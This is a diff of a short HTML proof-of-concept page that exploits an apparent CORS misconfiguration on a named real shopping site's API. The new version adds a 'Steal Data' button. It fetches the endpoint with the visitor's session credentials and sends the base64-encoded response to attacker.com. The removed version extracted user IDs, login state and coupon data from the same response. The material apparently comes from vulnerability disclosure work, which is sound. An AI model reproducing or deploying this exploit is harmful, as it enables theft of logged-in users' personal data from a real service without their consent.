@@ -1,47 +1,21 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>OPPO CORS PoC</title>
-</head>
-<body>
-  <h2>OPPO CORS Exploit PoC</h2>
-  <button onclick="runPoC()">Run PoC</button>
-  <pre id="output" style="white-space: pre-wrap; background:#f4f4f4; padding:10px; border:1px solid #ccc;"></pre>
+  <body>
+    <h2>OPPO CORS Exploit PoC</h2>
+    <button onclick="exploit()">Steal Data</button>
 
-  <script>
-    async function runPoC() {
-      const endpoints = [
-        "https://www.opposhop.cn/cn/oapi/configs/web/icons/700002"
-      ];
-
-      let results = [];
-      for (let ep of endpoints) {
-        try {
-          let res = await fetch(ep, { method: "GET", credentials: "include" });
-          let text = await res.text();
-          let parsed = null;
-
-          try {
-            parsed = JSON.parse(text);
-          } catch(e) {}
-
-          if (parsed) {
-            // Extract sensitive fields
-            let sensitive = {};
-            if (parsed.userId) sensitive.userId = parsed.userId;
-            if (parsed.isLogin !== undefined) sensitive.isLogin = parsed.isLogin;
-            if (parsed.couponList || parsed.data) sensitive.couponData = parsed.couponList || parsed.data;
-
-            results.push("✅ " + ep + ":\nSensitive Data:\n" + JSON.stringify(sensitive, null, 2) + "\n");
-          } else {
-            results.push("ℹ️ " + ep + ":\nResponse:\n" + text.substring(0,300) + "...\n");
-          }
-        } catch (e) {
-          results.push("❌ " + ep + ":\nError - " + e + "\n");
-        }
+    <script>
+      function exploit() {
+        fetch("https://www.opposhop.cn/cn/oapi/configs/web/icons/700002", {
+          credentials: "include"
+        })
+        .then(res => res.text())
+        .then(data => {
+          console.log("Exfiltrated Data:", data);
+          // Attacker could send this to their own server
+          fetch("https://attacker.com/log?data=" + btoa(data));
+        });
       }
-      document.getElementById("output").innerText = results.join("\n------\n\n");
-    }
-  </script>
-</body>
+    </script>
+  </body>
 </html>
